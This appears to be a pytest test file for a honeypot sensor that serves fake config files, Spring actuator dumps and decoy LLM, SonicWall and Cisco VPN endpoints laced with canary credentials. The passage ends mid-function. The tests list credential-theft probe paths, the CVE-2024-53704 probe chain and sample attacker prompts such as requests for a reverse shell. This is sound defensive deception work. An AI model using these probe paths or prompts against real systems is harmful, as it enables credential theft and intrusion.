def test_render_actuator_env_json_is_valid_and_per_hit_unique():
    # The actuator /env response MUST parse as JSON (scanners filter on shape)
    # and MUST embed a per-hit DB password — a fixed literal would fingerprint
    # every sensor identically (see the README "per-hit and Tracebit-backed"
    # design principle).
    body1 = tbenv.render_actuator_env_json(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body1)
    assert payload["activeProfiles"] == ["production"]
    sources = {s["name"]: s for s in payload["propertySources"]}
    assert "systemEnvironment" in sources
    assert sources["systemEnvironment"]["properties"]["AWS_ACCESS_KEY_ID"]["value"] \
        == "AKIAFAKEEXAMPLE01"
    app_source = next(s for name, s in sources.items() if name.startswith("applicationConfig"))
    pw1 = app_source["properties"]["spring.datasource.password"]["value"]
    assert pw1, "password must not be empty"
    # Second call mints a new synthetic password — never reused.
    body2 = tbenv.render_actuator_env_json(FAKE_TRACEBIT).decode("utf-8")
    pw2 = json.loads(body2)["propertySources"][2]["properties"]["spring.datasource.password"]["value"]
    assert pw1 != pw2


def test_render_actuator_configprops_is_valid_and_per_hit_unique():
    body1 = tbenv.render_actuator_configprops(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body1)
    beans = payload["contexts"]["application"]["beans"]
    ds = beans["spring.datasource-org.springframework.boot.autoconfigure.jdbc.DataSourceProperties"]
    assert ds["prefix"] == "spring.datasource"
    pw1 = ds["properties"]["password"]
    assert pw1
    aws_bean = beans["cloud.aws-org.springframework.cloud.aws.core.region.StaticRegionProvider"]
    assert aws_bean["properties"]["accessKey"] == "AKIAFAKEEXAMPLE01"
    body2 = tbenv.render_actuator_configprops(FAKE_TRACEBIT).decode("utf-8")
    pw2 = json.loads(body2)["contexts"]["application"]["beans"][
        "spring.datasource-org.springframework.boot.autoconfigure.jdbc.DataSourceProperties"
    ]["properties"]["password"]
    assert pw1 != pw2


def test_render_actuator_health_is_valid_and_per_hit_unique():
    body1 = tbenv.render_actuator_health(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body1)
    assert payload["status"] == "UP"
    db_url1 = payload["components"]["db"]["details"]["url"]
    assert db_url1.startswith("jdbc:postgresql://prod_rw:")
    redis_url1 = payload["components"]["redis"]["details"]["url"]
    body2 = tbenv.render_actuator_health(FAKE_TRACEBIT).decode("utf-8")
    p2 = json.loads(body2)
    assert p2["components"]["db"]["details"]["url"] != db_url1
    assert p2["components"]["redis"]["details"]["url"] != redis_url1


def test_render_actuator_mappings_is_valid_json():
    body = tbenv.render_actuator_mappings(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    handlers = payload["contexts"]["application"]["mappings"]["dispatcherServlets"]["dispatcherServlet"]
    # Webhook handler embeds the canary access key id in the URL pattern.
    assert any("AKIAFAKEEXAMPLE01" in h.get("predicate", "") for h in handlers)


def test_render_actuator_threaddump_is_valid_json():
    body = tbenv.render_actuator_threaddump(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    assert any(
        "AKIAFAKEEXAMPLE01" in t.get("threadName", "")
        for t in payload["threads"]
    ), "at least one thread name must carry the canary access key id"
    # Every thread MUST have the threadState field — scanners filter on shape.
    assert all("threadState" in t for t in payload["threads"])


def test_render_actuator_heapdump_carries_canary_in_raw_bytes():
    body = tbenv.render_actuator_heapdump(FAKE_TRACEBIT)
    # Heap dump harvesters grep raw bytes for AKIA / AWS_SECRET_ACCESS_KEY.
    assert b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert b"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI" in body
    # HPROF magic header so a content-sniffer accepts the response.
    assert body.startswith(b"JAVA PROFILE 1.0.2\x00")
    # Subsequent calls embed a different DB password (per-hit unique).
    other = tbenv.render_actuator_heapdump(FAKE_TRACEBIT)
    assert other != body


def test_default_canary_types_includes_gitlab_username_password():
    # /.env bare handler uses CANARY_TYPES when the caller doesn't pass an
    # explicit list. Default should request both aws (fires globally via
    # STS) and gitlab-username-password (fires against the Tracebit-hosted
    # gitlab URL, which format_env_payload emits alongside the creds).
    # Previously default was just ["aws"], which is why the canary dashboard
    # showed ~99% AWS even though the other types cost nothing extra to request.
    import importlib
    module = importlib.reload(tbenv)
    try:
        assert "aws" in module.CANARY_TYPES
        assert "gitlab-username-password" in module.CANARY_TYPES
    finally:
        importlib.reload(tbenv)


def test_find_canary_trap_returns_none_when_disabled(monkeypatch):
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", False)
    assert tbenv.find_canary_trap("/.aws/credentials") is None


def test_find_canary_trap_matches_case_insensitively(monkeypatch):
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    assert tbenv.find_canary_trap("/WP-Config.PHP") is not None
    assert tbenv.find_canary_trap("/.AWS/Credentials") is not None


def test_find_canary_trap_misses_non_trap_paths(monkeypatch):
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    for p in ["/", "/index.html", "/api/v4/projects", "/.env"]:
        assert tbenv.find_canary_trap(p) is None, f"unexpected match for {p}"


def test_every_trap_has_distinct_paths():
    """Catch accidental duplicates across traps (which one wins would be undefined)."""
    seen: dict[str, str] = {}
    for trap in tbenv.CANARY_TRAPS:
        for p in trap.paths:
            lp = p.lower()
            assert lp not in seen, f"{lp} claimed by both {seen[lp]} and {trap.name}"
            seen[lp] = trap.name


def test_gitlab_cookie_emits_set_cookie_header():
    """The gitlab-sign-in trap returns the gitlab-cookie canary as Set-Cookie,
    not in the body. That's how the scanner picks it up."""
    trap = tbenv._TRAP_BY_PATH["/users/sign_in"]
    headers = trap.extra_headers(FAKE_TRACEBIT)
    assert headers, "expected at least one extra header"
    names = {h[0] for h in headers}
    assert "Set-Cookie" in names
    cookie_value = next(v for k, v in headers if k == "Set-Cookie")
    assert "cookieCanaryValue" in cookie_value


async def _fake_canary(*args, **kwargs):
    return FAKE_TRACEBIT


async def test_dispatch_routes_aws_credentials_file_to_trap(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.aws/credentials",
        headers={"X-Forwarded-For": "203.0.113.10"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "aws-credentials-file"


@pytest.mark.parametrize("path", [
    "/.terraform/terraform.tfstate",
    "/terraform.tfstate",
    "/terraform.tfstate.backup",
])
async def test_dispatch_routes_terraform_tfstate_to_trap(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.14"})
    assert resp.status == 200
    assert resp.headers["Content-Type"] == "application/json; charset=utf-8"
    body = await resp.read()
    parsed = json.loads(body)
    assert parsed["version"] == 4
    assert parsed["resources"][0]["type"] == "aws_iam_access_key"
    attrs = parsed["resources"][0]["instances"][0]["attributes"]
    assert attrs["id"] == "AKIAFAKEEXAMPLE01"
    assert attrs["secret"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert parsed["outputs"]["deploy_access_key_id"]["value"] == "AKIAFAKEEXAMPLE01"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "terraform-tfstate"


def test_terraform_tfstate_lineage_and_serial_per_hit_unique():
    """Lineage uuid + serial vary per render so the rendered body can't be
    cross-sensor fingerprinted."""
    a = json.loads(tbenv.render_terraform_tfstate(FAKE_TRACEBIT))
    b = json.loads(tbenv.render_terraform_tfstate(FAKE_TRACEBIT))
    assert a["lineage"] != b["lineage"]
    # serial is a small int so a tie is possible but improbable; sample a few
    serials = {json.loads(tbenv.render_terraform_tfstate(FAKE_TRACEBIT))["serial"] for _ in range(8)}
    assert len(serials) > 1, "serial should vary across renders"


async def test_handle_swallows_body_read_disconnect():
    """A scanner that sends Content-Length and drops the socket before the body
    arrives makes `request.content.read()` raise ConnectionResetError. Without
    a handler this becomes a 30-line stack trace per hit. handle() should
    return a 499 Response and not let the exception propagate."""
    class _Stream:
        async def read(self, n):
            raise ConnectionResetError("Connection lost")

    class _Request:
        method = "POST"
        headers = {"Host": "x", "User-Agent": "u"}
        content = _Stream()
        rel_url = type("U", (), {"raw_path": "/x", "raw_query_string": ""})()

    resp = await tbenv.handle(_Request())
    assert resp.status == 499


@pytest.mark.parametrize("path", [
    "/wp-config.php.old",
    "/wp-config.php.save",
    "/wp-config.php.txt",
    "/wp-config.php.swp",
    "/wp-config.php~",
    "/wp-config.php::$DATA",
    "/wp-config-backup.php",
    "/backup/wp-config.php",
    "/%2577%2570%252D%2563%256F%256E%2566%2569%2567.%2570%2568%2570.%2562%2561%256B",
])
async def test_dispatch_routes_wp_config_backup_variants_to_trap(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.12"})
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-config"


async def test_dispatch_trap_404s_without_api_key(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)

    for path in ["/.aws/credentials", "/wp-config.php", "/id_rsa", "/api/v4/user"]:
        resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.11"})
        assert resp.status == 404, f"expected 404 for {path} sans API_KEY"


async def test_dispatch_trap_serves_on_any_host(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    for host in ["staging.victim.example", "example.com", "127.0.0.1"]:
        resp = await flux_client.get(
            "/wp-config.php",
            headers={"X-Forwarded-Host": host, "X-Forwarded-For": "203.0.113.13"},
        )
        assert resp.status == 200, f"trap should fire for Host={host!r}"
        body = await resp.read()
        assert b"AWS_ACCESS_KEY_ID" in body


async def test_dispatch_openai_config_embeds_aws_canary(flux_client, monkeypatch):
    """Scanner hitting /.openai/config.json gets a JSON doc whose api_key is
    the AWS canary value. Field names are OpenAI-flavored; the value is
    AWS-flavored. This is the intentional mismatch documented at the top
    of the AI-credential renderers."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.openai/config.json",
        headers={"X-Forwarded-For": "203.0.113.40"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["api_key"] == "AKIAFAKEEXAMPLE01"
    assert body["default_model"].startswith("gpt-")
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "openai-config"


async def test_dispatch_anthropic_config_embeds_aws_canary(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.anthropic/config.json",
        headers={"X-Forwarded-For": "203.0.113.41"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["auth_token"] == "AKIAFAKEEXAMPLE01"
    assert body["default_model"].startswith("claude-")
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "anthropic-config"


async def test_dispatch_cursor_mcp_embeds_canary_in_env_blocks(flux_client, monkeypatch):
    """The Cursor MCP config shape is nested — canary lives inside
    mcpServers[*].env. Scanners that flatten for secret-looking values
    still pick it up."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.cursor/mcp.json",
        headers={"X-Forwarded-For": "203.0.113.42"},
    )
    assert resp.status == 200
    body = await resp.json()
    servers = body["mcpServers"]
    assert servers["github"]["env"]["GITHUB_PERSONAL_ACCESS_TOKEN"] == "AKIAFAKEEXAMPLE01"
    assert servers["internal-tools"]["env"]["API_KEY"]
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "cursor-mcp"


async def test_dispatch_gitlab_sign_in_emits_set_cookie(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/users/sign_in",
        headers={"X-Forwarded-For": "203.0.113.14"},
    )
    assert resp.status == 200
    set_cookies = resp.headers.getall("Set-Cookie", [])
    assert any("cookieCanaryValue" in v for v in set_cookies), set_cookies


def test_is_fingerprint_path_case_insensitive(monkeypatch):
    monkeypatch.setattr(tbenv, "FINGERPRINT_PATHS_ENABLED", True)
    assert tbenv.is_fingerprint_path("/Index.HTML")


def test_is_fingerprint_path_non_match(monkeypatch):
    monkeypatch.setattr(tbenv, "FINGERPRINT_PATHS_ENABLED", True)
    for path in ["/wp-login.php", "/api/v1/users", "/readme", "/.env"]:
        assert not tbenv.is_fingerprint_path(path)


# --- Fake LLM-API endpoint trap ---
#
# Covers the path set scanner fleets were observed probing in April 2026
# across Ollama-native, OpenAI-compatible, and corporate AI-proxy shapes.


def test_llm_endpoint_enabled_by_default():
    """The trap is cheap, logs are cheap — default-on like webshell."""
    assert tbenv.LLM_ENDPOINT_ENABLED


def test_llm_endpoint_default_paths_cover_observed_probes():
    """Every path observed hitting our sensors in the April 2026
    AI-endpoint-probe window must match."""
    observed = [
        "/v1/models",              # generic OpenAI + Ollama-compatible list
        "/anthropic/v1/models",    # corporate AI-proxy target
        "/api/version",            # Ollama-specific
        "/api/tags",               # Ollama-specific
        "/api/chat",               # Ollama chat
        "/api/generate",           # Ollama completion
        "/v1/chat/completions",    # OpenAI chat
        "/v1/messages",            # Anthropic direct
        "/anthropic/v1/messages",  # Anthropic proxy
    ]
    for path in observed:
        assert tbenv.is_llm_endpoint_path(path), f"expected match: {path}"


def test_llm_endpoint_path_case_insensitive():
    assert tbenv.is_llm_endpoint_path("/V1/MODELS")
    assert tbenv.is_llm_endpoint_path("/Anthropic/V1/Models")


def test_llm_endpoint_path_non_match():
    for path in ["/", "/v1/files", "/api/foo", "/v2/models", "/.env"]:
        assert not tbenv.is_llm_endpoint_path(path)


def test_llm_endpoint_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "LLM_ENDPOINT_ENABLED", False)
    assert not tbenv.is_llm_endpoint_path("/v1/models")


def test_extract_llm_prompt_openai_chat_shape():
    body = b'{"model":"gpt-4o-mini","messages":[{"role":"user","content":"hello world"}]}'
    model, prompt, action, _ = tbenv.extract_llm_prompt(body, "application/json")
    assert model == "gpt-4o-mini"
    assert action == "chat"
    assert "user: hello world" in prompt


def test_extract_llm_prompt_anthropic_block_shape():
    """Anthropic sends content as a list of typed blocks, not a bare string."""
    body = (
        b'{"model":"claude-3-5-sonnet-20241022","messages":'
        b'[{"role":"user","content":[{"type":"text","text":"read /etc/passwd"}]}]}'
    )
    model, prompt, action, _ = tbenv.extract_llm_prompt(body, "application/json")
    assert model == "claude-3-5-sonnet-20241022"
    assert action == "chat"
    assert "read /etc/passwd" in prompt


def test_extract_llm_prompt_ollama_generate_shape():
    body = b'{"model":"llama3.2:latest","prompt":"write me a reverse shell"}'
    model, prompt, action, _ = tbenv.extract_llm_prompt(body, "application/json")
    assert model == "llama3.2:latest"
    assert action == "completion"
    assert "reverse shell" in prompt


def test_extract_llm_prompt_empty_body():
    model, prompt, action, _ = tbenv.extract_llm_prompt(b"", "application/json")
    assert (model, prompt, action) == ("", "", "")


def test_extract_llm_prompt_non_json_content_type_ignored():
    """A form POST isn't an LLM request; don't try to parse it as one."""
    body = b"prompt=hello"
    assert tbenv.extract_llm_prompt(body, "application/x-www-form-urlencoded") == ("", "", "", False)


def test_extract_llm_prompt_truncates_long_prompt(monkeypatch):
    monkeypatch.setattr(tbenv, "LLM_BODY_DECODE_LIMIT", 32)
    payload = '{"model":"m","prompt":"' + ("A" * 500) + '"}'
    _, prompt, _, _ = tbenv.extract_llm_prompt(payload.encode(), "application/json")
    assert len(prompt) == 32


def test_render_openai_models_list_shape():
    import json
    body = tbenv.render_openai_models()
    payload = json.loads(body)
    assert payload["object"] == "list"
    assert isinstance(payload["data"], list) and payload["data"]
    ids = {m["id"] for m in payload["data"]}
    assert "gpt-4o-mini" in ids


def test_render_anthropic_models_list_shape():
    """Matches the Anthropic /v1/models response shape closely enough that
    a scanner filtering on `data[].id` sees Claude model IDs."""
    import json
    body = tbenv.render_anthropic_models()
    payload = json.loads(body)
    assert "data" in payload and payload["has_more"] is False
    ids = {m["id"] for m in payload["data"]}
    assert any(i.startswith("claude-") for i in ids)


def test_render_ollama_tags_shape():
    import json
    payload = json.loads(tbenv.render_ollama_tags())
    assert "models" in payload and payload["models"]
    first = payload["models"][0]
    for field in ("name", "modified_at", "size", "digest", "details"):
        assert field in first, f"missing {field}"


def test_render_ollama_version_shape():
    import json
    payload = json.loads(tbenv.render_ollama_version())
    assert "version" in payload


def test_render_openai_chat_embeds_model_name():
    import json
    payload = json.loads(tbenv.render_openai_chat("gpt-4o-canary"))
    assert payload["model"] == "gpt-4o-canary"
    assert payload["choices"][0]["message"]["role"] == "assistant"


def test_render_anthropic_message_shape():
    import json
    payload = json.loads(tbenv.render_anthropic_message("claude-3-5-sonnet-20241022"))
    assert payload["type"] == "message"
    assert payload["role"] == "assistant"
    assert payload["content"][0]["type"] == "text"


async def test_dispatch_get_openai_models_returns_json_list(flux_client):
    """First scanner probe — unauthenticated GET /v1/models. Look real."""
    resp = await flux_client.get(
        "/v1/models",
        headers={"X-Forwarded-For": "203.0.113.20", "User-Agent": "scanner/1.0"},
    )
    assert resp.status == 200
    assert "application/json" in resp.headers.get("Content-Type", "")
    body = await resp.json()
    assert body["object"] == "list"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "llm-endpoint-models-list"
    assert entries[-1]["llmPath"] == "/v1/models"
    assert entries[-1]["llmHasAuth"] is False


async def test_dispatch_get_anthropic_models_logs_proxy_probe(flux_client):
    """GET /anthropic/v1/models from a scanner UA — the corporate AI-proxy
    probe shape. Logs the client IP and UA so follow-up probes can be linked."""
    resp = await flux_client.get(
        "/anthropic/v1/models",
        headers={
            "X-Forwarded-For": "203.0.113.10",
            "User-Agent": "Mozilla/5.0 (compatible; scanner/1.0)",
        },
    )
    assert resp.status == 200
    body = await resp.json()
    assert any(m["id"].startswith("claude-") for m in body["data"])
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "llm-endpoint-anthropic-models-list"
    assert entries[-1]["clientIp"] == "203.0.113.10"
    assert "scanner/1.0" in entries[-1]["userAgent"]


async def test_dispatch_post_openai_chat_captures_prompt_and_auth(flux_client):
    """The money shot: scanner sends a bearer token + a prompt, we log both."""
    import json
    resp = await flux_client.post(
        "/v1/chat/completions",
        headers={
            "X-Forwarded-For": "198.51.100.5",
            "Authorization": "Bearer sk-stolen-canary-abc123",
            "Content-Type": "application/json",
        },
        data=json.dumps({
            "model": "gpt-4o-mini",
            "messages": [{"role": "user", "content": "test if key works"}],
        }),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["object"] == "chat.completion"
    assert body["model"] == "gpt-4o-mini"

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-openai-chat"
    assert entry["llmModel"] == "gpt-4o-mini"
    assert entry["llmAction"] == "chat"
    assert entry["llmHasAuth"] is True
    assert entry["llmAuthScheme"] == "bearer"
    assert "test if key works" in entry["llmPromptPreview"]


async def test_dispatch_post_ollama_generate_captures_prompt(flux_client):
    import json
    resp = await flux_client.post(
        "/api/generate",
        headers={
            "X-Forwarded-For": "198.51.100.6",
            "Content-Type": "application/json",
        },
        data=json.dumps({"model": "llama3.2:latest", "prompt": "say hi"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["model"] == "llama3.2:latest"
    assert body["done"] is True
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-ollama-generate"
    assert entry["llmPromptPreview"] == "say hi"
    assert entry["llmHasAuth"] is False


async def test_dispatch_llm_endpoint_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "LLM_ENDPOINT_ENABLED", False)
    resp = await flux_client.get(
        "/v1/models",
        headers={"X-Forwarded-For": "203.0.113.99"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


async def test_dispatch_llm_endpoint_does_not_require_tracebit_key(flux_client, monkeypatch):
    """Like the webshell, the LLM trap has no upstream dep."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get("/api/version", headers={"X-Forwarded-For": "203.0.113.30"})
    assert resp.status == 200
    payload = await resp.json()
    assert "version" in payload


async def test_dispatch_llm_ollama_show_uses_model_from_body(flux_client):
    import json
    resp = await flux_client.post(
        "/api/show",
        headers={"X-Forwarded-For": "203.0.113.31", "Content-Type": "application/json"},
        data=json.dumps({"model": "qwen2.5-coder:7b"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert "qwen2.5-coder:7b" in body["modelfile"]


async def test_dispatch_llm_malformed_json_still_200(flux_client):
    """Scanner may send garbage; don't 500 — we want to look live."""
    resp = await flux_client.post(
        "/v1/chat/completions",
        headers={"X-Forwarded-For": "203.0.113.32", "Content-Type": "application/json"},
        data=b"{this is not json",
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-openai-chat"
    # Garbage body → no extracted prompt/model; still logged.
    assert entry["llmModel"] == ""
    assert "llmPromptPreview" not in entry


# --- Fake SonicWall SSL VPN trap ---
#
# Two overlapping behaviour patterns observed in mid-April 2026:
#   - A dedicated SonicWall-precondition fleet hitting only
#     `/api/sonicos/is-sslvpn-enabled`.
#   - A broader enterprise-appliance probe running the full chain
#     `is-sslvpn-enabled` → `auth` → `tfa` on every target.


def test_sonicwall_enabled_by_default():
    assert tbenv.SONICWALL_ENABLED
    assert tbenv.CISCO_WEBVPN_ENABLED


def test_sonicwall_default_paths_cover_cve_2024_53704_chain():
    """Every path in the observed CVE-2024-53704 bait sequence must match."""
    for path in (
        "/api/sonicos/is-sslvpn-enabled",
        "/api/sonicos/auth",
        "/api/sonicos/tfa",
    ):
        assert tbenv.is_sonicwall_path(path), f"expected match: {path}"


def test_sonicwall_path_is_case_insensitive():
    assert tbenv.is_sonicwall_path("/API/SonicOS/Auth")


def test_sonicwall_path_non_match():
    for path in ["/", "/api/sonicos", "/api/sonicos/other", "/.env", "/sonicos/auth"]:
        assert not tbenv.is_sonicwall_path(path)


def test_sonicwall_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "SONICWALL_ENABLED", False)
    assert not tbenv.is_sonicwall_path("/api/sonicos/is-sslvpn-enabled")


def test_extract_sonicwall_username_json():
    body = b'{"user":"admin","password":"guess"}'
    assert tbenv.extract_sonicwall_username(body, "application/json") == "admin"


def test_extract_sonicwall_username_form():
    body = b"user=root&password=guess"
    assert tbenv.extract_sonicwall_username(body, "application/x-www-form-urlencoded") == "root"


def test_extract_sonicwall_username_alternate_keys():
    assert tbenv.extract_sonicwall_username(b'{"username":"u1"}', "application/json") == "u1"
    assert tbenv.extract_sonicwall_username(b'{"login":"u2"}', "application/json") == "u2"


def test_extract_sonicwall_username_empty_body():
    assert tbenv.extract_sonicwall_username(b"", "application/json") == ""


def test_extract_sonicwall_username_malformed_json():
    assert tbenv.extract_sonicwall_username(b"{not json", "application/json") == ""


def test_render_sonicwall_is_sslvpn_enabled_shape():
    import json
    payload = json.loads(tbenv.render_sonicwall_is_sslvpn_enabled())
    assert payload["is_ssl_vpn_enabled"] is True
    assert payload["status"]["success"] is True


def test_render_sonicwall_auth_success_embeds_session_id():
    import json
    payload = json.loads(tbenv.render_sonicwall_auth_success("sess-abc"))
    assert payload["auth"]["session_id"] == "sess-abc"
    assert payload["auth"]["tfa_required"] is True
    assert payload["status"]["success"] is True


def test_render_sonicwall_tfa_success_clears_tfa_required():
    import json
    payload = json.loads(tbenv.render_sonicwall_tfa_success("sess-xyz"))
    assert payload["auth"]["session_id"] == "sess-xyz"
    assert payload["auth"]["tfa_required"] is False


async def test_dispatch_sonicwall_is_sslvpn_enabled_returns_true(flux_client):
    """CVE-2024-53704 step 1: the precondition check. Scanner wants a 200 +
    boolean true to proceed to the auth POST."""
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={"X-Forwarded-For": "203.0.113.20", "User-Agent": "scanner/1.0"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["is_ssl_vpn_enabled"] is True

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-is-sslvpn-enabled"
    assert entry["sonicwallPath"] == "/api/sonicos/is-sslvpn-enabled"
    assert entry["sonicwallMethod"] == "GET"
    assert entry["clientIp"] == "203.0.113.20"


async def test_dispatch_sonicwall_auth_post_captures_username_and_body(flux_client):
    """The money shot: scanner POSTs credentials, we log the username and
    the full body hash for post-hoc replay analysis."""
    import json
    resp = await flux_client.post(
        "/api/sonicos/auth",
        headers={
            "X-Forwarded-For": "203.0.113.21",
            "Content-Type": "application/json",
        },
        data=json.dumps({"user": "admin", "password": "admin"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["status"]["success"] is True
    assert body["auth"]["tfa_required"] is True
    assert body["auth"]["session_id"]

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-auth"
    assert entry["sonicwallUsername"] == "admin"
    assert entry["sonicwallMethod"] == "POST"
    assert entry["bodySha256"]
    assert "admin" in entry["bodyPreview"]
    assert "password" in entry["bodyPreview"]


async def test_dispatch_sonicwall_tfa_post_captures_payload(flux_client):
    """Step 3 of the chain: TFA bypass. Log whatever the scanner sends."""
    import json
    resp = await flux_client.post(
        "/api/sonicos/tfa",
        headers={
            "X-Forwarded-For": "203.0.113.21",
            "Content-Type": "application/json",
        },
        data=json.dumps({"code": "000000", "session_id": "replayed"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["auth"]["tfa_required"] is False

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-tfa"
    assert "000000" in entry["bodyPreview"]


async def test_dispatch_sonicwall_form_body_username(flux_client):
    """Some SonicOS clients send x-www-form-urlencoded instead of JSON."""
    resp = await flux_client.post(
        "/api/sonicos/auth",
        headers={
            "X-Forwarded-For": "203.0.113.40",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        data="user=root&password=abc",
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["sonicwallUsername"] == "root"


async def test_dispatch_sonicwall_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "SONICWALL_ENABLED", False)
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={"X-Forwarded-For": "203.0.113.41"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


async def test_dispatch_sonicwall_does_not_require_tracebit_key(flux_client, monkeypatch):
    """Like webshell/LLM, no upstream dep — the intel is the probe itself."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={"X-Forwarded-For": "203.0.113.42"},
    )
    assert resp.status == 200


async def test_dispatch_sonicwall_detects_session_cookie(flux_client):
    """If a scanner replays a harvested SonicOS session cookie, flag it —
    that's a stronger compromise signal than a cold probe."""
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={
            "X-Forwarded-For": "203.0.113.43",
            "Cookie": "swap_session=stolen-abc; other=x",
        },
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["sonicwallHasAuth"] is True


async def test_dispatch_sonicwall_malformed_json_still_200(flux_client):
    """Scanner may send garbage; don't 500."""
    resp = await flux_client.post(
        "/api/sonicos/auth",
        headers={"X-Forwarded-For": "203.0.113.44", "Content-Type": "application/json"},
        data=b"{broken",
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-auth"
    assert entry["sonicwallUsername"] == ""


# --- Fake Cisco WebVPN trap ---


def test_cisco_webvpn_enabled_by_default():
    assert tbenv.CISCO_WEBVPN_ENABLED


def test_cisco_webvpn_default_paths_match_observed_sequence():
    for path in (
        "/+CSCOE+/logon.html",
        "/+CSCOE+/logon_forms.js",
        "/+CSCOL+/Java.jar",
        "/+CSCOL+/a1.jar",
    ):
        assert tbenv.is_cisco_webvpn_path(path), f"expected match: {path}"


def test_cisco_webvpn_path_non_match():
